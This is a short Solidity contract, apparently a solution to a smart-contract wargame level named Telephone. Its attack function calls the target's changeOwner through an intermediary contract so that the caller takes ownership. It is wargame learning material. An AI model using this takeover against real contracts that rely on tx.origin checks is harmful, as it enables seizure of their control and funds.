
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack { ITelephone public targetContract; 
constructor(address _telephone) {
   targetContract = ITelephone(_telephone);
}

function attack() public {
    targetContract.changeOwner(msg.sender);
}
}
